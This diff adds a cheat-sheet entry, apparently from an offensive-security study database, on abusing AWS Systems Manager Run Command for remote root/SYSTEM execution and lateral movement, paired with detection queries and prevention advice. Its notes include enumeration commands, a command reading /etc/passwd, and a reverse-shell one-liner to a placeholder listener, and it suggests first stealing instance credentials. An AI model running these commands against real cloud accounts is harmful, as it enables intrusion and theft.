@@ -1,0 +1,107 @@
+{
+  "id": "aws-ssm-command-exec",
+  "name": "AWS SSM - Remote Command Exec on Instances (No SSH)",
+  "command": "aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> --parameters commands=<cmd>",
+  "description": "With ssm:SendCommand or ssm:StartSession permissions, run arbitrary commands on managed EC2 instances through Systems Manager without SSH, open ports, or key material. Commands execute as root (Linux) or SYSTEM (Windows) via the SSM agent, making SSM a powerful lateral-movement and privesc path when an attacker holds the right IAM permissions.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "AWS Attacks",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "hackingthe.cloud",
+  "tags": [
+    "aws",
+    "ssm",
+    "run-command",
+    "session-manager",
+    "lateral-movement",
+    "rce"
+  ],
+  "mitre": [
+    "T1651",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PERMISSIONS NEEDED ===\n  ssm:SendCommand  (+ the instance must have the SSM agent + an instance\n  profile with AmazonSSMManagedInstanceCore). For shells: ssm:StartSession.\n\n=== FIND MANAGED INSTANCES ===\n  aws ssm describe-instance-information\n  aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId'\n\n=== RUN A COMMAND (Linux) ===\n  aws ssm send-command --document-name \"AWS-RunShellScript\" \\\n    --instance-ids <target> \\\n    --parameters 'commands=[\"id\",\"whoami\",\"cat /etc/passwd\"]'\n  # get the output:\n  aws ssm list-command-invocations --command-id <id> --details\n\n=== RUN A COMMAND (Windows) ===\n  aws ssm send-command --document-name \"AWS-RunPowerShellScript\" \\\n    --instance-ids <target> --parameters 'commands=[\"whoami\",\"ipconfig\"]'\n\n=== INTERACTIVE SHELL (runs as root/SYSTEM) ===\n  aws ssm start-session --target <target>\n  # needs the session-manager-plugin installed locally\n\n=== REVERSE SHELL ONE-LINER ===\n  aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> \\\n    --parameters 'commands=[\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"]'\n\n=== NOTES ===\n  - No inbound ports required; all traffic is instance->SSM outbound.\n  - Execution user is root (Linux) / SYSTEM (Windows) via the agent.",
+  "examples": [
+    {
+      "label": "List SSM-managed instances",
+      "command": "aws ssm describe-instance-information --query 'InstanceInformationList[].{Id:InstanceId,OS:PlatformType}'"
+    },
+    {
+      "label": "Run id/whoami on a target",
+      "command": "aws ssm send-command --document-name AWS-RunShellScript --instance-ids <target> --parameters 'commands=[\"id\",\"whoami\"]'"
+    },
+    {
+      "label": "Interactive Session Manager shell",
+      "command": "aws ssm start-session --target <target>"
+    }
+  ],
+  "references": [
+    {
+      "title": "hackingthe.cloud - Survey of SSM abuse",
+      "url": "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/"
+    },
+    {
+      "title": "AWS docs - Run Command (Systems Manager)",
+      "url": "https://docs.aws.amazon.com/systems-manager/latest/userguide/execute-remote-commands.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-imds-ssrf-creds",
+      "note": "Grab instance creds first, then pivot with SSM.",
+      "rel": "prereq"
+    },
+    {
+      "id": "aws-pacu-enum",
+      "note": "Enumerate which instances and roles you can reach.",
+      "rel": "prereq"
+    },
+    {
+      "id": "cloud-enumerate-iam",
+      "note": "Confirm you hold ssm:SendCommand / StartSession.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-impacket-dcomexec",
+      "note": "On-prem remote-exec analogue; SSM Run Command is the cloud-native equivalent.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "SSM is a legitimate management channel. An identity with ssm:SendCommand or ssm:StartSession can execute on any instance that runs the SSM agent with the core managed-instance policy, as root/SYSTEM, with no network exposure - so stolen IAM credentials become instance code execution.",
+    "prerequisites": "IAM permission ssm:SendCommand (and/or ssm:StartSession), target instances with the SSM agent running and an instance profile granting AmazonSSMManagedInstanceCore.",
+    "impact": "Code execution as root/SYSTEM on arbitrary managed instances; lateral movement across the fleet, credential theft from instances, and data access - all from one IAM principal.",
+    "detection": "[MITRE T1651] CloudTrail ssm:SendCommand / ssm:StartSession events, especially from unusual principals or against many instances; AWS-RunShellScript/AWS-RunPowerShellScript document invocations; new session starts outside change windows.",
+    "artifacts": "CloudTrail events SendCommand, StartSession, with requestParameters.documentName and instanceIds; SSM command history (list-command-invocations); on-host SSM agent logs under /var/log/amazon/ssm/.",
+    "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=SendCommand OR eventName=StartSession)\n| stats count values(requestParameters.instanceIds{}) as targets by userIdentity.arn, requestParameters.documentName\n| where count>0",
+    "elastic_kql": "event.provider:\"ssm.amazonaws.com\" and aws.cloudtrail.event_name:(SendCommand or StartSession)",
+    "sentinel_kql": "AWSCloudTrail\n| where EventName in (\"SendCommand\",\"StartSession\")\n| extend Doc=tostring(parse_json(RequestParameters).documentName)\n| summarize Count=count() by UserIdentityArn, Doc, SourceIpAddress",
+    "sigma_rules": "aws_ssm_send_command_exec",
+    "prevention": "Restrict ssm:SendCommand/StartSession to specific principals and instance tags via IAM conditions; require Session Manager logging to S3/CloudWatch with KMS; alert on RunShellScript/RunPowerShellScript use; use SSM session preferences to disable root shells and record sessions; least-privilege instance profiles.",
+    "sources": [
+      "https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/",
+      "https://docs.aws.amazon.com/systems-manager/latest/userguide/execute-remote-commands.html"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "SSM remote command execution via RunShellScript/RunPowerShellScript",
+        "logic": "index=aws sourcetype=aws:cloudtrail eventName=SendCommand\n| spath requestParameters.documentName output=doc\n| search doc=\"AWS-RunShellScript\" OR doc=\"AWS-RunPowerShellScript\"\n| stats count dc(requestParameters.instanceIds{}) as instances by userIdentity.arn, sourceIPAddress",
+        "data_source": "cloud-trail",
+        "attack": [
+          "T1651"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate automation/patching pipelines that use Run Command",
+        "tuning": "Allowlist known automation roles; alert on SendCommand from interactive/human principals or to many instances at once"
+      }
+    ]
+  }
+}
